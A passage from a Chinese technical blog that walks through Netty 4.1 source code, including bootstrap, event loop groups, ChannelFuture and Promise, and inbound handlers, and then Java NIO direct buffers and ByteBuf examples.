ctx.channel().writeAndFlush(&quot;from server: &quot; + UUID.randomUUID()); } /** * 出现异常关闭连接 * @param ctx * @param cause * @throws Exception */ @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception { cause.printStackTrace(); ctx.close(); }} 客服端MyClient 类 /** * @Author: cuzz * @Date: 2019/1/1 20:31 * @Description: */public class MyClient { public static void main(String[] args) throws Exception { EventLoopGroup eventLoopGroup = new NioEventLoopGroup(); try { Bootstrap bootstrap = new Bootstrap(); bootstrap.group(eventLoopGroup) .channel(NioSocketChannel.class) .handler(new MyClientInitializer()); ChannelFuture channelFuture = bootstrap.connect(&quot;localhost&quot;,8899).sync(); channelFuture.channel().closeFuture().sync(); } finally { eventLoopGroup.shutdownGracefully(); } }} MyClientInitializer 类 /** * @Author: cuzz * @Date: 2019/1/1 20:40 * @Description: */public class MyClientInitializer extends ChannelInitializer&lt;SocketChannel&gt;{ @Override protected void initChannel(SocketChannel ch) throws Exception { ChannelPipeline pipeline = ch.pipeline(); pipeline.addLast(new LengthFieldBasedFrameDecoder(Integer.MAX_VALUE, 0, 4, 0, 4)); pipeline.addLast(new LengthFieldPrepender(4)); pipeline.addLast(new StringDecoder(CharsetUtil.UTF_8)); pipeline.addLast(new StringEncoder(CharsetUtil.UTF_8)); pipeline.addLast(new MyClientHandler()); }} MyClientHandler 类 /** * @Author: cuzz * @Date: 2019/1/1 20:42 * @Description: */public class MyClientHandler extends SimpleChannelInboundHandler&lt;String&gt;{ @Override protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception { System.out.println(ctx.channel().remoteAddress() + &quot;: &quot; + msg); ctx.writeAndFlush(&quot;from clinet: &quot; + UUID.randomUUID()); } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception { cause.printStackTrace(); ctx.close(); } @Override public void channelActive(ChannelHandlerContext ctx) throws Exception { ctx.writeAndFlush(&quot;来自客户端的连接！！！&quot;); }} 初始化EventLoopGroup创建一个 bossGroup 和 workGroup EventLoopGroup bossGroup = new NioEventLoopGroup();EventLoopGroup workGroup = new NioEventLoopGroup(); EventLoopGroup 翻译过来叫事件循环组，其本身就是一个死循环 bossGroup 是把接受连接，把连接转发给 workGroup ，workGroup 是真正完成用户请求处理的类 EventLoopGroup 是一个接口，在后面循环的过程中可以选择把 Channel 注册上 /** * Special {@link EventExecutorGroup} which allows registering {@link Channel}s that get * processed for later selection during the event loop. * */public interface EventLoopGroup extends EventExecutorGroup { @Override EventLoop next(); ChannelFuture register(Channel channel); ChannelFuture register(ChannelPromise promise);} NioEventLoopGroup// 他是一个基于NIO的选择器的对象 public class NioEventLoopGroup extends MultithreadEventLoopGroup { // 0 public NioEventLoopGroup() { this(0); } // 1 public NioEventLoopGroup(int nThreads) { this(nThreads, (Executor) null); } // 2 public NioEventLoopGroup(int nThreads, Executor executor) { this(nThreads, executor, SelectorProvider.provider()); }} MultithreadEventExecutorGroup最终会跳到MultithreadEventExecutorGroup 中的一个构造器中 protected MultithreadEventExecutorGroup(int nThreads, Executor executor, EventExecutorChooserFactory chooserFactory, Object... args) { } // 1 if (executor == null) { executor = new ThreadPerTaskExecutor(newDefaultThreadFactory()); } children = new EventExecutor[nThreads]; for (int i = 0; i &lt; nThreads; i ++) { boolean success = false; try { children[i] = newChild(executor, args); success = true; } catch (Exception e) { // TODO: Think about if this is a good exception type throw new IllegalStateException(&quot;failed to create a child event loop&quot;, e); } finally { if (!success) { for (int j = 0; j &lt; i; j ++) { children[j].shutdownGracefully(); } for (int j = 0; j &lt; i; j ++) { EventExecutor e = children[j]; try { while (!e.isTerminated()) { e.awaitTermination(Integer.MAX_VALUE, TimeUnit.SECONDS); } } catch (InterruptedException interrupted) { // Let the caller handle the interruption. Thread.currentThread().interrupt(); break; } } } } } chooser = chooserFactory.newChooser(children); final FutureListener&lt;Object&gt; terminationListener = new FutureListener&lt;Object&gt;() { @Override public void operationComplete(Future&lt;Object&gt; future) throws Exception { if (terminatedChildren.incrementAndGet() == children.length) { terminationFuture.setSuccess(null); } } }; for (EventExecutor e: children) { e.terminationFuture().addListener(terminationListener); } Set&lt;EventExecutor&gt; childrenSet = new LinkedHashSet&lt;EventExecutor&gt;(children.length); Collections.addAll(childrenSet, children); readonlyChildren = Collections.unmodifiableSet(childrenSet); } ThreadPerTaskExecutor代码1中，executor = new ThreadPerTaskExecutor(newDefaultThreadFactory());，跟进去 public final class ThreadPerTaskExecutor implements Executor { private final ThreadFactory threadFactory; public ThreadPerTaskExecutor(ThreadFactory threadFactory) { if (threadFactory == null) { throw new NullPointerException(&quot;threadFactory&quot;); } this.threadFactory = threadFactory; } @Override public void execute(Runnable command) { threadFactory.newThread(command).start(); }} 这里用到了工厂方法和命令模式，通过传入一个command调用工厂方法 Executorpublic interface Executor { /** * Executes the given command at some time in the future. The command * may execute in a new thread, in a pooled thread, or in the calling * thread, at the discretion of the {@code Executor} implementation. * * @param command the runnable task * @throws RejectedExecutionException if this task cannot be * accepted for execution * @throws NullPointerException if command is null */ void execute(Runnable command);} 这是在java.util.concurrent 下的一个接口，最主要的实现方式把一个task传入，新建一个线程运行 class ThreadPerTaskExecutor implements Executor { public void execute(Runnable r) { new Thread(r).start(); }} 也可以通过一系列的限制，比如序列化等一下操作 class SerialExecutor implements Executor { final Queue&lt;Runnable&gt; tasks = new ArrayDeque&lt;Runnable&gt;(); final Executor executor; Runnable active; SerialExecutor(Executor executor) { this.executor = executor; } public synchronized void execute(final Runnable r) { tasks.offer(new Runnable() { public void run() { try { r.run(); } finally { scheduleNext(); } } }); if (active == null) { scheduleNext(); } } protected synchronized void scheduleNext() { if ((active = tasks.poll()) != null) { executor.execute(active); } }} 其中非常常用用的几个实现如：ExecutorService，ThreadPoolExecutor 下面是官方文档 The Executor implementations provided in this package implement ExecutorService, which is a more extensive interface. The ThreadPoolExecutor class provides an extensible thread pool implementation. The Executors class provides convenient factory methods for these Executors.The Executor implementations provided in this package implement ExecutorService, which is a more extensive interface. The ThreadPoolExecutor class provides an extensible thread pool implementation. The Executors class provides convenient factory methods for these Executors. 回顾一下 MyServer 中启动的代码 try { ServerBootstrap bootstrap = new ServerBootstrap(); bootstrap.group(bossGroup, workGroup) .channel(NioServerSocketChannel.class) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new MyServerinitializer()); ChannelFuture channelFuture = bootstrap.bind(8899).sync(); channelFuture.channel().closeFuture().sync();} finally { bossGroup.shutdownGracefully(); bossGroup.shutdownGracefully();} ServerBootstrappublic class ServerBootstrap extends AbstractBootstrap&lt;ServerBootstrap, ServerChannel&gt; { ... } ServerBootstrap 是 Bootstrap子类，容易的地启动一个 ServerChannel ServerChannel接受一个即将到来的连接，创建子 Channel /** * A {@link Channel} that accepts an incoming connection attempt and creates * its child {@link Channel}s by accepting them. {@link ServerSocketChannel} is * a good example. */public interface ServerChannel extends Channel { // This is a tag interface.} 其有很多实现的子类，其中 NioServerSocketChannel 是我们比较关注的 方法链bootstrap.group(bossGroup, workGroup) .channel(NioServerSocketChannel.class) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new MyServerinitializer()); .group(bossGroup, workGroup) 我们把 bossGroup 和 workGroup 传入进去，由于是方法链，肯定返回本身，跟踪下去 /** * Set the {@link EventLoopGroup} for the parent (acceptor) and the child (client). These * {@link EventLoopGroup}'s are used to handle all the events and IO for {@link ServerChannel} and * {@link Channel}'s. */public ServerBootstrap group(EventLoopGroup parentGroup, EventLoopGroup childGroup) { super.group(parentGroup); if (childGroup == null) { throw new NullPointerException(&quot;childGroup&quot;); } if (this.childGroup != null) { throw new IllegalStateException(&quot;childGroup set already&quot;); } this.childGroup = childGroup; return this;} 这个步，就是给 bossGroup 和 workGroup 赋值给 ServerBootstrap 的实例 .channel(NioServerSocketChannel.class) 方法，接受的是一个 class 对象，一般接受 class 对象大多数与反射有关系 /** * The {@link Class} which is used to create {@link Channel} instances from. * You either use this or {@link #channelFactory(io.netty.channel.ChannelFactory)} if your * {@link Channel} implementation has no no-args constructor. */public B channel(Class&lt;? extends C&gt; channelClass) { if (channelClass == null) { throw new NullPointerException(&quot;channelClass&quot;); } return channelFactory(new ReflectiveChannelFactory&lt;C&gt;(channelClass));} 进入 channelFactory 方法 /** * {@link io.netty.channel.ChannelFactory} which is used to create {@link Channel} instances from * when calling {@link #bind()}. This method is usually only used if {@link #channel(Class)} * is not working for you because of some more complex needs. If your {@link Channel} implementation * has a no-args constructor, its highly recommend to just use {@link #channel(Class)} for * simplify your code. */@SuppressWarnings({ &quot;unchecked&quot;, &quot;deprecation&quot; })public B channelFactory(io.netty.channel.ChannelFactory&lt;? extends C&gt; channelFactory) { return channelFactory((ChannelFactory&lt;C&gt;) channelFactory);} 如果有无参数的构造方法推荐使用，这样可以简化代码 Q：为什么必须要有无参数构造方法呢？ A : 一般来说，获取一个实例如下生成，所以必须有无参数构造方法 Class class = Class.forName(className);Object object = class.newInstance(); // 只能调用无参构造函数 我们在来看看 NioServerSocketChannel A {@link io.netty.channel.socket.ServerSocketChannel} implementation which uses NIO selector based implementation to accept new connections. .childHandler(new MyServerinitializer()); 设置用于请求的 Handler /** * Set the {@link ChannelHandler} which is used to serve the request for the {@link Channel}'s. */public ServerBootstrap childHandler(ChannelHandler childHandler) { if (childHandler == null) { throw new NullPointerException(&quot;childHandler&quot;); } this.childHandler = childHandler; return this;} 这里其实有 handler 和 childHandler 一个是给 bossGroup 使用的，一个是给 workGroup 使用的 启动ChannelFuture channelFuture = bootstrap.bind(8899).sync(); ChannelFutureChannelFuture 先是继承了自己提供的 Future ，自身的 Future 又继承 java.util.concurrent.Future&lt;V&gt; ，我们先看看 JUC 中 Future 和 FutureTask JUC.Future看看其中几个主要的方法，从方法名也知道是做什么的 public interface Future&lt;V&gt; { boolean cancel(boolean mayInterruptIfRunning); boolean isCancelled(); boolean isDone(); V get() throws InterruptedException, ExecutionException; V get(long timeout, TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException;} 文档： A Future represents the result of an asynchronous computation. Methods are provided to check if the computation is complete, to wait for its completion, and to retrieve the result of the computation. The result can only be retrieved using method get when the computation has completed, blocking if necessary until it is ready. Cancellation is performed by the cancel method. Additional methods are provided to determine if the task completed normally or was cancelled. Once a computation has completed, the computation cannot be cancelled. If you would like to use a Future for the sake of cancellability but not provide a usable result, you can declare types of the form Future&lt;?&gt; and return null as a result of the underlying task. 使用： interface ArchiveSearcher { String search(String target); }class App { ExecutorService executor = ... ArchiveSearcher searcher = ... void showSearch(final String target) throws InterruptedException { Future&lt;String&gt; future = executor.submit(new Callable&lt;String&gt;() { public String call() { return searcher.search(target); } }); displayOtherThings(); // do other things while searching try { displayText(future.get()); // use future } catch (ExecutionException ex) { cleanup(); return; } }} JUC.FutureTask The FutureTask class is an implementation of Future that implements Runnable, and so may be executed by an Executor. For example, the above construction with submit could be replaced by: FutureTask&lt;String&gt; future = new FutureTask&lt;String&gt;(new Callable&lt;String&gt;() { public String call() { return searcher.search(target); }});executor.execute(future); 可以通过 Executor 的实例去执行，最后再从 future 中获取 Netty.Futurepublic interface Future&lt;V&gt; extends java.util.concurrent.Future&lt;V&gt; { boolean isSuccess(); boolean isCancellable(); Throwable cause(); /** * Adds the specified listener to this future. The * specified listener is notified when this future is * {@linkplain #isDone() done}. If this future is already * completed, the specified listener is notified immediately. */ Future&lt;V&gt; addListener(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt; listener); /** * Adds the specified listeners to this future. The * specified listeners are notified when this future is * {@linkplain #isDone() done}. If this future is already * completed, the specified listeners are notified immediately. */ Future&lt;V&gt; addListeners(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt;... listeners); /** * Removes the first occurrence of the specified listener from this future. * The specified listener is no longer notified when this * future is {@linkplain #isDone() done}. If the specified * listener is not associated with this future, this method * does nothing and returns silently. */ Future&lt;V&gt; removeListener(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt; listener); /** * Removes the first occurrence for each of the listeners from this future. * The specified listeners are no longer notified when this * future is {@linkplain #isDone() done}. If the specified * listeners are not associated with this future, this method * does nothing and returns silently. */ Future&lt;V&gt; removeListeners(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt;... listeners); // 等待Future完成 Future&lt;V&gt; sync() throws InterruptedException; Future&lt;V&gt; syncUninterruptibly(); Future&lt;V&gt; await() throws InterruptedException; Future&lt;V&gt; awaitUninterruptibly(); boolean await(long timeout, TimeUnit unit) throws InterruptedException; boolean await(long timeoutMillis) throws InterruptedException; boolean awaitUninterruptibly(long timeout, TimeUnit unit); boolean awaitUninterruptibly(long timeoutMillis); V getNow(); @Override boolean cancel(boolean mayInterruptIfRunning);} 我们主要看看 xxListener 方法，一后缀为 Listener 使用了观察者模式 它比 JUC.Future 更厉害的是就因为这个 Listener ，虽然 JUC.Future 可以调用 get() 方法，获取异步结果，但是我们不知道什么时候去调用，调用早了就堵塞在那里；而 Netty.Future 使用了观察者模式，当完成时会自动触发 ChannelFuture我们回到 ChannelFuture ，都重写了 Netty.Future 中的方法，返回值是 Future 的子类，java5或者以前，必须一样，java7以后可以不同，但是必须是父类返回值的派生类 public interface ChannelFuture extends Future&lt;Void&gt; { /** * Returns a channel where the I/O operation associated with this * future takes place. */ Channel channel(); @Override ChannelFuture addListener(GenericFutureListener&lt;? extends Future&lt;? super Void&gt;&gt; listener); @Override ChannelFuture addListeners(GenericFutureListener&lt;? extends Future&lt;? super Void&gt;&gt;... listeners); @Override ChannelFuture removeListener(GenericFutureListener&lt;? extends Future&lt;? super Void&gt;&gt; listener); @Override ChannelFuture removeListeners(GenericFutureListener&lt;? extends Future&lt;? super Void&gt;&gt;... listeners); @Override ChannelFuture sync() throws InterruptedException; @Override ChannelFuture syncUninterruptibly(); @Override ChannelFuture await() throws InterruptedException; @Override ChannelFuture awaitUninterruptibly(); 文档： io.netty.channelpublic interface ChannelFutureextends Future The result of an asynchronous Channel I/O operation. All I/O operations in Netty are asynchronous. It means any I/O calls will return immediately with no guarantee that the requested I/O operation has been completed at the end of the call. Instead, you will be returned with a ChannelFuture instance which gives you the information about the result or status of the I/O operation. A ChannelFuture is either uncompleted or completed. When an I/O operation begins, a new future object is created. The new future is uncompleted initially - it is neither succeeded, failed, nor cancelled because the I/O operation is not finished yet. If the I/O operation is finished either successfully, with failure, or by cancellation, the future is marked as completed with more specific information, such as the cause of the failure. Please note that even failure and cancellation belong to the completed state. +---------------------------+ | Completed successfully | +---------------------------+ +----&gt; isDone() = true |+--------------------------+ | | isSuccess() = true || Uncompleted | | +===========================++--------------------------+ | | Completed with failure || isDone() = false | | +---------------------------+| isSuccess() = false |----+----&gt; isDone() = true || isCancelled() = false | | | cause() = non-null || cause() = null | | +===========================++--------------------------+ | | Completed by cancellation | | +---------------------------+ +----&gt; isDone() = true | | isCancelled() = true | +---------------------------+ Various methods are provided to let you check if the I/O operation has been completed, wait for the completion, and retrieve the result of the I/O operation. It also allows you to add ChannelFutureListeners so you can get notified when the I/O operation is completed. 推荐使用监听器而不是等待的方法 // BAD - NEVER DO THIS@Overridepublic void channelRead(ChannelHandlerContext ctx, Object msg) { ChannelFuture future = ctx.channel().close(); future.awaitUninterruptibly(); // Perform post-closure operation // ...}// GOOD@Overridepublic void channelRead(ChannelHandlerContext ctx, Object msg) { ChannelFuture future = ctx.channel().close(); future.addListener(new ChannelFutureListener() { public void operationComplete(ChannelFuture future) { // Perform post-closure operation // ... } });} 不要混淆连接超时和等待超时 // BAD - NEVER DO THISBootstrap b = ...;ChannelFuture f = b.connect(...);f.awaitUninterruptibly(10, TimeUnit.SECONDS);if (f.isCancelled()) { // Connection attempt cancelled by user} else if (!f.isSuccess()) { // You might get a NullPointerException here because the future // might not be completed yet. f.cause().printStackTrace();} else { // Connection established successfully}// GOODBootstrap b = ...;// Configure the connect timeout option.b.option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);ChannelFuture f = b.connect(...);f.awaitUninterruptibly();// Now we are sure the future is completed.assert f.isDone();if (f.isCancelled()) { // Connection attempt cancelled by user} else if (!f.isSuccess()) { f.cause().printStackTrace();} else { // Connection established successfully} bind()方法当我们调用 bind 方法时，才真正的启动服务器 ChannelFuture channelFuture = bootstrap.bind(8899).sync(); 通过一些判断最终到 doBind 方法上 private ChannelFuture doBind(final SocketAddress localAddress) { final ChannelFuture regFuture = initAndRegister(); final Channel channel = regFuture.channel(); if (regFuture.cause() != null) { return regFuture; } if (regFuture.isDone()) { // At this point we know that the registration was complete and successful. ChannelPromise promise = channel.newPromise(); doBind0(regFuture, channel, localAddress, promise); return promise; } else { // Registration future is almost always fulfilled already, but just in case it's not. final PendingRegistrationPromise promise = new PendingRegistrationPromise(channel); regFuture.addListener(new ChannelFutureListener() { @Override public void operationComplete(ChannelFuture future) throws Exception { Throwable cause = future.cause(); if (cause != null) { // Registration on the EventLoop failed so fail the ChannelPromise directly to not cause an // IllegalStateException once we try to access the EventLoop of the Channel. promise.setFailure(cause); } else { // Registration was successful, so set the correct executor to use. // See https://github.com/netty/netty/issues/2586 promise.registered(); doBind0(regFuture, channel, localAddress, promise); } } }); return promise; }} initAndRegister()方法这个主要是初始化和注册，比较复杂，后续在分析 加油！！！","link":"/2019/01/03/Netty_%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"Netty 源码分析（四）","text":"版本 4.1.15 官网：https://netty.io/ Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers &amp; clients. ChannelPromiseio.netty.channel.ChannelPromise 前面我们分析了 ChannelFuture ，看看ChannelPromise 的作用 /** * Special {@link ChannelFuture} which is writable. */public interface ChannelPromise extends ChannelFuture, Promise&lt;Void&gt; { ... } 这是一个可以写入的 ChannelFuture ，我先看看 Promise 这个类 Promiseio.netty.util.concurrent.Promise public interface Promise&lt;V&gt; extends Future&lt;V&gt; { /** * Marks this future as a success and notifies all * listeners. * * If it is success or failed already it will throw an {@link IllegalStateException}. */ Promise&lt;V&gt; setSuccess(V result); /** * Marks this future as a success and notifies all * listeners. * * @return {@code true} if and only if successfully marked this future as * a success. Otherwise {@code false} because this future is * already marked as either a success or a failure. */ boolean trySuccess(V result); /** * Marks this future as a failure and notifies all * listeners. * * If it is success or failed already it will throw an {@link IllegalStateException}. */ Promise&lt;V&gt; setFailure(Throwable cause); /** * Marks this future as a failure and notifies all * listeners. * * @return {@code true} if and only if successfully marked this future as * a failure. Otherwise {@code false} because this future is * already marked as either a success or a failure. */ boolean tryFailure(Throwable cause); /** * Make this future impossible to cancel. * * @return {@code true} if and only if successfully marked this future as uncancellable or it is already done * without being cancelled. {@code false} if this future has been cancelled already. */ boolean setUncancellable(); @Override Promise&lt;V&gt; addListener(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt; listener); @Override Promise&lt;V&gt; addListeners(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt;... listeners); @Override Promise&lt;V&gt; removeListener(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt; listener); @Override Promise&lt;V&gt; removeListeners(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt;... listeners); @Override Promise&lt;V&gt; await() throws InterruptedException; @Override Promise&lt;V&gt; awaitUninterruptibly(); @Override Promise&lt;V&gt; sync() throws InterruptedException; @Override Promise&lt;V&gt; syncUninterruptibly();} JDK 所提供的的 Future 只能通过手工的方式检查执行结果，而这个操作是会阻塞的；Netty 则对 ChannelFutre 进行了增强，通过 ChannelFutureListener 以回调的方式来获取执行结果，去除了手工检查阻塞的操作，值得注意的是，ChannelFutrureListener 的 operationComplete 方法是由I/O线程执行的，因此要注意的是不要在这里执行耗时操作，否则需要通过另外的线程或线程池来执行 ChannelInboundHandlerAdapterio.netty.channel.ChannelInboundHandlerAdapter io.netty.channelpublic class ChannelInboundHandlerAdapterextends ChannelHandlerAdapter implements ChannelInboundHandlerAbstract base class for ChannelInboundHandler implementations which provide implementations of all of their methods. This implementation just forward the operation to the next ChannelHandler in the ChannelPipeline. Sub-classes may override a method implementation to change this. Be aware that messages are not released after the channelRead(ChannelHandlerContext, Object) method returns automatically. If you are looking for a ChannelInboundHandler implementation that releases the received messages automatically, please see SimpleChannelInboundHandler. 这里使用了适配器模式 ChannelInboundHandlerio.netty.channel.ChannelInboundHandler /** * {@link ChannelHandler} which adds callbacks for state changes. This allows the user * to hook in to state changes easily. */public interface ChannelInboundHandler extends ChannelHandler { /** * The {@link Channel} of the {@link ChannelHandlerContext} was registered with its {@link EventLoop} */ void channelRegistered(ChannelHandlerContext ctx) throws Exception; /** * The {@link Channel} of the {@link ChannelHandlerContext} was unregistered from its {@link EventLoop} */ void channelUnregistered(ChannelHandlerContext ctx) throws Exception; /** * The {@link Channel} of the {@link ChannelHandlerContext} is now active */ void channelActive(ChannelHandlerContext ctx) throws Exception; /** * The {@link Channel} of the {@link ChannelHandlerContext} was registered is now inactive and reached its * end of lifetime. */ void channelInactive(ChannelHandlerContext ctx) throws Exception; /** * Invoked when the current {@link Channel} has read a message from the peer. */ void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception; /** * Invoked when the last message read by the current read operation has been consumed by * {@link #channelRead(ChannelHandlerContext, Object)}. If {@link ChannelOption#AUTO_READ} is off, no further * attempt to read an inbound data from the current {@link Channel} will be made until * {@link ChannelHandlerContext#read()} is called. */ void channelReadComplete(ChannelHandlerContext ctx) throws Exception; /** * Gets called if an user event was triggered. */ void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception; /** * Gets called once the writable state of a {@link Channel} changed. You can check the state with * {@link Channel#isWritable()}. */ void channelWritabilityChanged(ChannelHandlerContext ctx) throws Exception; /** * Gets called if a {@link Throwable} was thrown. */ @Override @SuppressWarnings(&quot;deprecation&quot;) void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception;} SimpleChannelInboundHandlerio.netty.channel.SimpleChannelInboundHandler 我们在写自己的 Handler 的时候长会继承这个 SimpleChannelInboundHandler public class MyServerHandler extends SimpleChannelInboundHandler&lt;String&gt;{ @Override protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception { System.out.println(ctx.channel().remoteAddress() + &quot;: &quot; + msg); ctx.channel().writeAndFlush(&quot;from server: &quot; + UUID.randomUUID()); } /** * 出现异常关闭连接 * @param ctx * @param cause * @throws Exception */ @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception { cause.printStackTrace(); ctx.close(); }} 我们看看这个文档 io.netty.channelpublic abstract class SimpleChannelInboundHandlerextends ChannelInboundHandlerAdapterChannelInboundHandlerAdapter which allows to explicit only handle a specific type of messages. For example here is an implementation which only handle String messages. public class StringHandler extends SimpleChannelInboundHandler&lt;String&gt; { @Override protected void channelRead0(ChannelHandlerContext ctx, String message) throws Exception { System.out.println(message); }} Be aware that depending of the constructor parameters it will release all handled messages by passing them to ReferenceCountUtil.release(Object). In this case you may need to use ReferenceCountUtil.retain(Object) if you pass the object to the next handler in the ChannelPipeline.Forward compatibility notice 我们可以通过泛型指定消息类型 @Overridepublic void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception { boolean release = true; try { if (acceptInboundMessage(msg)) { @SuppressWarnings(&quot;unchecked&quot;) I imsg = (I) msg; channelRead0(ctx, imsg); } else { release = false; ctx.fireChannelRead(msg); } } finally { if (autoRelease &amp;&amp; release) { // 把这个消息计数减一，当减为0就丢弃 ReferenceCountUtil.release(msg); } }}/** * &lt;strong&gt;Please keep in mind that this method will be renamed to * {@code messageReceived(ChannelHandlerContext, I)} in 5.0.&lt;/strong&gt; * * Is called for each message of type {@link I}. * * @param ctx the {@link ChannelHandlerContext} which this {@link SimpleChannelInboundHandler} * belongs to * @param msg the message to handle * @throws Exception is thrown if an error occurred */protected abstract void channelRead0(ChannelHandlerContext ctx, I msg) throws Exception; 给我们强制转换为特定的类型，再调用 channelRead0 方法，这是一个抽象方法，需要我们自己去实现 ReferenceCountedio.netty.util.ReferenceCounted io.netty.utilpublic interface ReferenceCountedA reference-counted object that requires explicit deallocation.When a new ReferenceCounted is instantiated, it starts with the reference count of 1. retain() increases the reference count, and release() decreases the reference count. If the reference count is decreased to 0, the object will be deallocated explicitly, and accessing the deallocated object will usually result in an access violation.If an object that implements ReferenceCounted is a container of other objects that implement ReferenceCounted, the contained objects will also be released via release() when the container’s reference count becomes 0. ctx.channel().write()和ctx.write()的区别在 Netty 中有两种发消息的方式，可以直接写到 Channel 中，也可以写到与 ChannelHandler 所关联的那个 ChannelHandlerContext 中，对于 ctx.channel().write() 方式来说，消息会从 ChannelPipeline 的末尾开始流动，对于 ctx.write() 来说，消息将从 ChannelPipeline 中的下一个 ChannelHandler 开始流动 这篇博客个解释了 https://blog.csdn.net/FishSeeker/article/details/78447684 结论： ChannelHandlerContext 与 ChannelHandler 之间的关联绑定关系是永远不会发生改变的，因此对其进行缓存时没有任何问题的 对于与 Channel 的同名方法来说， ChannelHandlerContext 的方法将会产生更短的事件流，所以我们因该在可能的情况下利用这个特性来提升性能 Java NIONIO 总结使用 NIO 进行文件读取所涉及的步骤： 从 FileInputStream 对象获取到 Channel 对象 创建 Buffer 将数据从 Channel 中读取到Buffer中 0 &lt;= mark &lt;= position &lt;= limit &lt;= capacity flip() 方法： 将 limit 值设置为当前的 position 将 position 设置 0 clear() 方法： 将 limit 设置为capacity 将 position 设置为0 compact() 方法： 将所有未读的数据复制到 buffer 起始的位置处 将 position 设置为最后一个未读元素的后面 将 limit 设置为 capacity 现在buffer 就准备好了，但是不会覆盖未读的数据 Java NIO中，关于DirectBuffer，HeapBuffer的疑问？ DirectBuffer 属于堆外存，那应该还是属于用户内存，而不是内核内存？ FileChannel 的read(ByteBuffer dst)函数,write(ByteBuffer src)函数中，如果传入的参数是HeapBuffer类型,则会临时申请一块DirectBuffer,进行数据拷贝，而不是直接进行数据传输，这是出于什么原因？ 答案： https://www.zhihu.com/question/57374068/answer/152691891 Java NIO中的direct buffer（主要是DirectByteBuffer）其实是分两部分的： Java | native |DirectByteBuffer | malloc'd[ address ] -+-&gt; [ data ] | 其中 DirectByteBuffer 自身是一个Java对象，在Java堆中；而这个对象中有个long类型字段address，记录着一块调用 malloc() 申请到的native memory。 所以回到题主的问题： \\1. DirectBuffer 属于堆外存，那应该还是属于用户内存，而不是内核内存？ DirectByteBuffer 自身是（Java）堆内的，它背后真正承载数据的buffer是在（Java）堆外——native memory中的。这是 malloc() 分配出来的内存，是用户态的。 \\2. FileChannel 的read(ByteBuffer dst)函数,write(ByteBuffer src)函数中，如果传入的参数是HeapBuffer类型,则会临时申请一块DirectBuffer,进行数据拷贝，而不是直接进行数据传输，这是出于什么原因？ 题主看的是OpenJDK的 sun.nio.ch.IOUtil.write(FileDescriptor fd, ByteBuffer src, long position, NativeDispatcher nd) 的实现对不对： static int write(FileDescriptor fd, ByteBuffer src, long position, NativeDispatcher nd) throws IOException{ if (src instanceof DirectBuffer) return writeFromNativeBuffer(fd, src, position, nd); // Substitute a native buffer int pos = src.position(); int lim = src.limit(); assert (pos &lt;= lim); int rem = (pos &lt;= lim ? lim - pos : 0); ByteBuffer bb = Util.getTemporaryDirectBuffer(rem); try { bb.put(src); bb.flip(); // Do not update src until we see how many bytes were written src.position(pos); int n = writeFromNativeBuffer(fd, bb, position, nd); if (n &gt; 0) { // now update src src.position(pos + n); } return n; } finally { Util.offerFirstTemporaryDirectBuffer(bb); }} 这里其实是在迁就OpenJDK里的HotSpot VM的一点实现细节。 HotSpot VM里的GC除了CMS之外都是要移动对象的，是所谓“compacting GC”。 如果要把一个Java里的 byte[] 对象的引用传给native代码，让native代码直接访问数组的内容的话，就必须要保证native代码在访问的时候这个 byte[] 对象不能被移动，也就是要被“pin”（钉）住。 可惜HotSpot VM出于一些取舍而决定不实现单个对象层面的object pinning，要pin的话就得暂时禁用GC——也就等于把整个Java堆都给pin住。HotSpot VM对JNI的Critical系API就是这样实现的。这用起来就不那么顺手。 所以 Oracle/Sun JDK / OpenJDK 的这个地方就用了点绕弯的做法。它假设把 HeapByteBuffer 背后的 byte[] 里的内容拷贝一次是一个时间开销可以接受的操作，同时假设真正的I/O可能是一个很慢的操作。 于是它就先把 HeapByteBuffer 背后的 byte[] 的内容拷贝到一个 DirectByteBuffer 背后的native memory去，这个拷贝会涉及 sun.misc.Unsafe.copyMemory() 的调用，背后是类似 memcpy() 的实现。这个操作本质上是会在整个拷贝过程中暂时不允许发生GC的，虽然实现方式跟JNI的Critical系API不太一样。（具体来说是 Unsafe.copyMemory() 是HotSpot VM的一个intrinsic方法，中间没有safepoint所以GC无法发生）。 然后数据被拷贝到native memory之后就好办了，就去做真正的I/O，把 DirectByteBuffer 背后的native memory地址传给真正做I/O的函数。这边就不需要再去访问Java对象去读写要做I/O的数据了。 ByteBuf文档：https://netty.io/4.1/api/index.html 我们看第一个例子 public class ByteBufTest01 { public static void main(String[] args) { final ByteBuf buffer = Unpooled.buffer(10); for (int i = 0, index = 120; i &lt; 10; i++) { buffer.writeByte(index + i); } for (int i = 0; i &lt; 10; i++) { System.out.println(buffer.getByte(i)); } }} 输出： 120121122123124125126127-128-127 我们来看看这个方法的文档 /** * Sets the specified byte at the current {@code writerIndex} * and increases the {@code writerIndex} by {@code 1} in this buffer. * The 24 high-order bits of the specified value are ignored. * * @throws IndexOutOfBoundsException * if {@code this.writableBytes} is less than {@code 1} */public abstract ByteBuf writeByte(int value); 虽然传入的一个 int 值，可是它会丢弃高位的 24 bit，我们知道 int 是 4 字节（32 bit），丢弃 3 字节 （24 bit），就保留到 1 字节（8 bit） 我们要看下一个例子 public class ByteBufTest02 { public static void main(String[] args) { ByteBuf byteBuf = Unpooled.copiedBuffer(&quot;hello world&quot;, 